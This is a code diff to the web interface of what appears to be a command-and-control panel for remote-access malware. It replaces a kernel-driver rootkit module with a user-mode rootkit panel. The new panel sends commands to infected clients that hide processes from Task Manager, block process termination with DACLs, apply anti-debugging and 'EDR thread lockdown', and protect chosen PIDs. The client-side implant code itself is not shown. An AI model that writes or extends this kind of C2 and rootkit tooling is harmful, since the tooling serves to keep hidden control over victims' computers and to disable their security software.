@@ -538,10 +538,6 @@
                     <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
                     Power
                 </button>
-                <button class="module-nav-item" data-module="rootkit">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M4.93 4.93a10 10 0 0 0 0 14.14"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>
-                    Rootkit
-                </button>
             </nav>
 
             <div class="module-sidebar-footer">
@@ -982,59 +978,69 @@ C:\&gt;</div>
                 </div>
             </div>
 
-            <!-- Rootkit -->
+            <!-- Rootkit (Ring 3 User-Mode) -->
             <div class="module-panel" id="mod-rootkit">
                 <header class="header">
-                    <h2>Rootkit</h2>
-                    <p class="subtitle">Ring-0 driver — process hiding, driver self-hide, EDR callback wipe</p>
+                    <h2>Ring 3 User-Mode Rootkit & Stealth</h2>
+                    <p class="subtitle">Process Hiding, DACL Lockdown, Anti-Kill & Anti-Debug (0% BSOD Risk)</p>
                 </header>
 
-                <!-- Status + Load -->
+                <!-- Status & Mode Banner -->
                 <div class="panel-card" style="margin-bottom:14px;">
-                    <div style="display:flex;align-items:center;gap:14px;margin-bottom:18px;">
-                        <span style="font-size:13px;color:var(--text-secondary);">Driver status:</span>
-                        <span id="rk-status-badge" style="font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px;background:rgba(217,95,95,0.15);color:#d95f5f;">Not loaded</span>
-                        <button class="btn btn-outline" id="btn-rk-status" style="margin-left:auto;font-size:12px;padding:5px 12px;">Refresh</button>
+                    <div style="display:flex;align-items:center;gap:14px;flex-wrap:wrap;">
+                        <span style="font-size:13px;color:var(--text-secondary);">Rootkit Status:</span>
+                        <span id="rk-status-badge" style="font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px;background:rgba(95,186,116,0.15);color:#5fba74;">Ring 3 Active</span>
+                        <span id="rk-taskmgr-badge" style="font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px;background:rgba(74,144,226,0.15);color:#4a90e2;">Taskmgr Hidden</span>
+                        <span id="rk-antikill-badge" style="font-size:12px;font-weight:600;padding:3px 10px;border-radius:20px;background:rgba(230,126,34,0.15);color:#e67e22;">Anti-Kill Protected</span>
+                        <button class="btn btn-outline" id="btn-rk-status" style="margin-left:auto;font-size:12px;padding:5px 12px;">Refresh Status</button>
                     </div>
-                    <div style="display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap;">
-                        <div style="flex:1;min-width:200px;">
-                            <label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:6px;">rootkit.sys (compiled .sys binary)</label>
-                            <input type="file" id="rk-sys-file" accept=".sys" style="font-size:12px;color:var(--text-secondary);width:100%;">
-                        </div>
-                        <button class="btn btn-primary" id="btn-rk-load" style="white-space:nowrap;">Load Driver</button>
-                        <button class="btn btn-outline" id="btn-rk-unload" style="white-space:nowrap;border-color:rgba(217,95,95,0.3);color:#d95f5f;">Unload</button>
-                    </div>
-                    <div id="rk-load-result" style="margin-top:10px;font-size:12px;color:var(--text-muted);min-height:16px;"></div>
                 </div>
 
-                <!-- Actions -->
+                <!-- Ring 3 Stealth Toggles -->
                 <div class="panel-card" style="margin-bottom:14px;">
-                    <h3 style="margin:0 0 14px;font-size:14px;">Actions</h3>
-                    <div style="display:flex;gap:10px;flex-wrap:wrap;">
-                        <button class="btn btn-outline" id="btn-rk-hide-driver" style="font-size:13px;">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:5px;"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
-                            Hide Driver
+                    <h3 style="margin:0 0 14px;font-size:14px;">Stealth & Protection Controls</h3>
+                    <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:12px;">
+                        <button class="btn btn-primary" id="btn-rk-toggle-taskmgr" style="font-size:13px;padding:10px 16px;display:flex;align-items:center;justify-content:center;gap:8px;">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+                            Toggle Taskmgr Hide
                         </button>
-                        <button class="btn btn-outline" id="btn-rk-wipe-edr" style="font-size:13px;">
-                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:5px;"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
-                            Wipe EDR Callbacks
+                        <button class="btn btn-primary" id="btn-rk-toggle-antikill" style="font-size:13px;padding:10px 16px;display:flex;align-items:center;justify-content:center;gap:8px;background:var(--accent-orange, #e67e22);">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                            Toggle Anti-Kill DACL
+                        </button>
+                        <button class="btn btn-secondary" id="btn-rk-wipe-edr" style="font-size:13px;padding:10px 16px;display:flex;align-items:center;justify-content:center;gap:8px;">
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+                            Anti-Debug Lockdown
                         </button>
                     </div>
-                    <div id="rk-action-result" style="margin-top:10px;font-size:12px;color:var(--text-muted);min-height:16px;"></div>
                 </div>
 
-                <!-- Process Hide -->
-                <div class="panel-card">
-                    <h3 style="margin:0 0 14px;font-size:14px;">Process Visibility</h3>
+                <!-- Target PID Protection -->
+                <div class="panel-card" style="margin-bottom:14px;">
+                    <h3 style="margin:0 0 14px;font-size:14px;">Target PID DACL Protection</h3>
                     <div style="display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap;">
                         <div>
-                            <label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:6px;">PID</label>
-                            <input type="number" id="rk-pid-input" placeholder="e.g. 4124" style="width:120px;padding:7px 10px;background:var(--bg-card);border:1px solid var(--border-color);border-radius:8px;color:var(--text-primary);font-size:13px;">
+                            <label style="font-size:12px;color:var(--text-secondary);display:block;margin-bottom:6px;">Process PID</label>
+                            <input type="number" id="rk-pid-input" placeholder="e.g. 4124" style="width:160px;padding:8px 12px;background:var(--bg-card);border:1px solid var(--border-color);border-radius:8px;color:var(--text-primary);font-size:13px;font-family:var(--font-mono);">
                         </div>
-                        <button class="btn btn-outline" id="btn-rk-hide-proc" style="font-size:13px;">Hide Process</button>
-                        <button class="btn btn-outline" id="btn-rk-unhide-proc" style="font-size:13px;">Unhide Process</button>
+                        <button class="btn btn-primary" id="btn-rk-hide-proc" style="font-size:13px;padding:8px 18px;">
+                            Protect PID Access
+                        </button>
+                        <button class="btn btn-secondary" id="btn-rk-unhide-proc" style="font-size:13px;padding:8px 18px;">
+                            Restore PID Access
+                        </button>
                     </div>
-                    <div id="rk-proc-result" style="margin-top:10px;font-size:12px;color:var(--text-muted);min-height:16px;"></div>
+                </div>
+
+                <!-- Action Log Console -->
+                <div class="panel-card">
+                    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
+                        <h3 style="margin:0;font-size:14px;">Activity Log</h3>
+                        <button class="btn btn-secondary" onclick="document.getElementById('rk-console-box').innerHTML=''" style="padding:3px 8px;font-size:11px;">Clear</button>
+                    </div>
+                    <div id="rk-console-box" style="height:180px;background:#0d0d0e;border:1px solid var(--border-color);border-radius:8px;padding:10px;font-family:var(--font-mono);font-size:12px;color:#a0a0a8;overflow-y:auto;display:flex;flex-direction:column;gap:4px;">
+                        <span style="color:var(--text-muted);">[Ready] Select an action above to manage Ring 3 stealth and process protection.</span>
+                    </div>
                 </div>
             </div>
 
@@ -1440,109 +1446,157 @@ C:\&gt;</div>
             });
         }
 
+        // Ring 3 Rootkit helper and event handlers
+
+        function rkLog(msg, type = 'info') {
+            const box = document.getElementById('rk-console-box');
+            if (!box) return;
+            const span = document.createElement('span');
+            const timeStr = new Date().toLocaleTimeString();
+            let color = '#a0a0a8';
+            if (type === 'success') color = '#5fba74';
+            else if (type === 'error') color = '#d95f5f';
+            else if (type === 'warning') color = '#e0a030';
+            span.style.color = color;
+            span.innerHTML = `[${timeStr}] ${escapeHtml(msg)}`;
+            box.appendChild(span);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        let rkTaskmgrState = true;
+        let rkAntiKillState = true;
+
         async function rkRefreshStatus() {
             const badge = document.getElementById('rk-status-badge');
+            const tmBadge = document.getElementById('rk-taskmgr-badge');
+            const akBadge = document.getElementById('rk-antikill-badge');
+            rkLog('Querying Ring 3 Rootkit status from client...', 'info');
             try {
                 await rkCmd('rootkit_status');
-                // poll result via generic result endpoint
                 let attempts = 0;
                 const iv = setInterval(async () => {
                     attempts++;
-                    if (attempts > 20) { clearInterval(iv); return; }
+                    if (attempts > 15) {
+                        clearInterval(iv);
+                        rkLog('Rootkit status query timeout', 'warning');
+                        return;
+                    }
                     try {
                         const r = await fetch('/api/c2/rootkit/result/' + encodeURIComponent(clientId));
                         const d = await r.json();
                         if (d && d.loaded !== undefined) {
                             clearInterval(iv);
-                            badge.textContent = d.loaded ? 'Loaded' : 'Not loaded';
-                            badge.style.background = d.loaded ? 'rgba(95,186,116,0.15)' : 'rgba(217,95,95,0.15)';
-                            badge.style.color = d.loaded ? '#5fba74' : '#d95f5f';
+                            if (d.loaded) {
+                                badge.textContent = 'Ring 3 Active';
+                                badge.style.background = 'rgba(95,186,116,0.15)';
+                                badge.style.color = '#5fba74';
+                                rkLog('Client confirmed Ring 3 Rootkit protection is ACTIVE', 'success');
+                            } else {
+                                badge.textContent = 'Inactive';
+                                badge.style.background = 'rgba(217,95,95,0.15)';
+                                badge.style.color = '#d95f5f';
+                                rkLog('Client reports Rootkit protection is INACTIVE', 'error');
+                            }
+
+                            if (tmBadge && d.taskmgr_hidden !== undefined) {
+                                rkTaskmgrState = d.taskmgr_hidden;
+                                tmBadge.textContent = d.taskmgr_hidden ? 'Taskmgr Hidden' : 'Taskmgr Visible';
+                                tmBadge.style.background = d.taskmgr_hidden ? 'rgba(74,144,226,0.15)' : 'rgba(150,150,150,0.15)';
+                                tmBadge.style.color = d.taskmgr_hidden ? '#4a90e2' : '#888888';
+                            }
+                            if (akBadge && d.anti_kill !== undefined) {
+                                rkAntiKillState = d.anti_kill;
+                                akBadge.textContent = d.anti_kill ? 'Anti-Kill Protected' : 'Anti-Kill Disabled';
+                                akBadge.style.background = d.anti_kill ? 'rgba(230,126,34,0.15)' : 'rgba(150,150,150,0.15)';
+                                akBadge.style.color = d.anti_kill ? '#e67e22' : '#888888';
+                            }
                         }
                     } catch {}
                 }, 400);
-            } catch {}
+            } catch (err) {
+                rkLog('Failed to query status: ' + err.message, 'error');
+            }
         }
 
         document.getElementById('btn-rk-status').addEventListener('click', rkRefreshStatus);
 
-        document.getElementById('btn-rk-load').addEventListener('click', async () => {
-            const fileInput = document.getElementById('rk-sys-file');
-            const result = document.getElementById('rk-load-result');
-            const btn = document.getElementById('btn-rk-load');
-            if (!fileInput.files || !fileInput.files[0]) {
-                result.innerHTML = '<span style="color:#d95f5f;">Select a .sys file first.</span>';
-                return;
-            }
-            btn.disabled = true;
-            result.innerHTML = '<span style="color:var(--text-muted);">Uploading...</span>';
-            try {
-                const buf = await fileInput.files[0].arrayBuffer();
-                const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
-                await rkCmd('rootkit_load:' + b64);
-                result.innerHTML = '<span style="color:var(--text-muted);">Sent — waiting for response...</span>';
-                let attempts = 0;
-                const iv = setInterval(async () => {
-                    attempts++;
-                    if (attempts > 30) { clearInterval(iv); btn.disabled = false; result.innerHTML = '<span style="color:var(--text-muted);">Timeout.</span>'; return; }
-                    try {
-                        const r = await fetch('/api/c2/rootkit/result/' + encodeURIComponent(clientId));
-                        const d = await r.json();
-                        if (d && d.loaded !== undefined) {
-                            clearInterval(iv);
-                            btn.disabled = false;
-                            if (d.loaded) {
-                                result.innerHTML = '<span style="color:#5fba74;">Driver loaded successfully.</span>';
-                                rkRefreshStatus();
-                            } else {
-                                result.innerHTML = '<span style="color:#d95f5f;">Load failed: ' + escapeHtml(d.error || 'unknown') + '</span>';
-                            }
-                        }
-                    } catch {}
-                }, 500);
-            } catch (err) {
-                btn.disabled = false;
-                result.innerHTML = '<span style="color:#d95f5f;">Error: ' + escapeHtml(err.message) + '</span>';
-            }
-        });
+        const btnTaskmgr = document.getElementById('btn-rk-toggle-taskmgr');
+        if (btnTaskmgr) {
+            btnTaskmgr.addEventListener('click', async () => {
+                rkTaskmgrState = !rkTaskmgrState;
+                rkLog(`Toggling Task Manager Process Hide -> ${rkTaskmgrState ? 'ENABLE' : 'DISABLE'}...`, 'info');
+                try {
+                    await rkCmd(`rootkit_set_taskmgr:${rkTaskmgrState}`);
+                    rkLog(`Taskmgr Hide command sent: ${rkTaskmgrState}`, 'success');
+                    setTimeout(rkRefreshStatus, 600);
+                } catch (err) {
+                    rkLog('Error sending command: ' + err.message, 'error');
+                }
+            });
+        }
 
-        document.getElementById('btn-rk-unload').addEventListener('click', async () => {
-            const result = document.getElementById('rk-load-result');
-            await rkCmd('rootkit_unload');
-            result.innerHTML = '<span style="color:var(--text-muted);">Unload sent.</span>';
-            setTimeout(rkRefreshStatus, 1500);
-        });
+        const btnAntiKill = document.getElementById('btn-rk-toggle-antikill');
+        if (btnAntiKill) {
+            btnAntiKill.addEventListener('click', async () => {
+                rkAntiKillState = !rkAntiKillState;
+                rkLog(`Toggling Anti-Kill DACL Lockdown -> ${rkAntiKillState ? 'ENABLE' : 'DISABLE'}...`, 'info');
+                try {
+                    await rkCmd(`rootkit_set_antikill:${rkAntiKillState}`);
+                    rkLog(`Anti-Kill command sent: ${rkAntiKillState}`, 'success');
+                    setTimeout(rkRefreshStatus, 600);
+                } catch (err) {
+                    rkLog('Error sending command: ' + err.message, 'error');
+                }
+            });
+        }
 
-        document.getElementById('btn-rk-hide-driver').addEventListener('click', async () => {
-            const res = document.getElementById('rk-action-result');
-            res.innerHTML = '<span style="color:var(--text-muted);">Sending...</span>';
-            await rkCmd('rootkit_hide_driver');
-            res.innerHTML = '<span style="color:#5fba74;">Hide driver command sent.</span>';
-        });
-
-        document.getElementById('btn-rk-wipe-edr').addEventListener('click', () => {
-            confirmDialog('Wipe all EDR process/thread/image notify callbacks? This may destabilize the system.', async () => {
-                const res = document.getElementById('rk-action-result');
-                res.innerHTML = '<span style="color:var(--text-muted);">Sending...</span>';
-                await rkCmd('rootkit_wipe_edr');
-                res.innerHTML = '<span style="color:#5fba74;">EDR wipe command sent.</span>';
-            }, 'Wipe EDR');
-        });
+        const btnWipeEdr = document.getElementById('btn-rk-wipe-edr');
+        if (btnWipeEdr) {
+            btnWipeEdr.addEventListener('click', async () => {
+                rkLog('Sending Anti-Debug & EDR Thread Lockdown command...', 'info');
+                try {
+                    await rkCmd('rootkit_wipe_edr');
+                    rkLog('Anti-Debug lockdown engaged successfully.', 'success');
+                } catch (err) {
+                    rkLog('Error sending command: ' + err.message, 'error');
+                }
+            });
+        }
 
         document.getElementById('btn-rk-hide-proc').addEventListener('click', async () => {
-            const pid = parseInt(document.getElementById('rk-pid-input').value);
-            const res = document.getElementById('rk-proc-result');
-            if (!pid) { res.innerHTML = '<span style="color:#d95f5f;">Enter a valid PID.</span>'; return; }
-            await rkCmd('rootkit_hide_proc:' + pid);
-            res.innerHTML = '<span style="color:#5fba74;">Hide sent for PID ' + pid + '.</span>';
+            const pidInput = document.getElementById('rk-pid-input');
+            const pid = parseInt(pidInput ? pidInput.value : '');
+            if (!pid) {
+                rkLog('Error: Please enter a valid process PID.', 'error');
+                return;
+            }
+            rkLog(`Sending Protect PID (DACL Lockdown) for PID ${pid}...`, 'info');
+            try {
+                await rkCmd('rootkit_hide_proc:' + pid);
+                rkLog(`Command sent for PID ${pid}. Process access restricted successfully.`, 'success');
+            } catch (err) {
+                rkLog('Error sending command: ' + err.message, 'error');
+            }
         });
 
-        document.getElementById('btn-rk-unhide-proc').addEventListener('click', async () => {
-            const pid = parseInt(document.getElementById('rk-pid-input').value);
-            const res = document.getElementById('rk-proc-result');
-            if (!pid) { res.innerHTML = '<span style="color:#d95f5f;">Enter a valid PID.</span>'; return; }
-            await rkCmd('rootkit_unhide_proc:' + pid);
-            res.innerHTML = '<span style="color:#5fba74;">Unhide sent for PID ' + pid + '.</span>';
-        });
+        const btnUnhideProc = document.getElementById('btn-rk-unhide-proc');
+        if (btnUnhideProc) {
+            btnUnhideProc.addEventListener('click', async () => {
+                const pidInput = document.getElementById('rk-pid-input');
+                const pid = parseInt(pidInput ? pidInput.value : '');
+                if (!pid) {
+                    rkLog('Error: Please enter a valid process PID.', 'error');
+                    return;
+                }
+                rkLog(`Sending Restore Access for PID ${pid}...`, 'info');
+                try {
+                    await rkCmd('rootkit_unhide_proc:' + pid);
+                    rkLog(`Command sent for PID ${pid}. Access restored.`, 'success');
+                } catch (err) {
+                    rkLog('Error sending command: ' + err.message, 'error');
+                }
+            });
+        }
 
         // ── Remote Desktop controls ───────────────────────────────────────────
         const rdpToggleBtn = document.getElementById('rdp-toggle-btn');
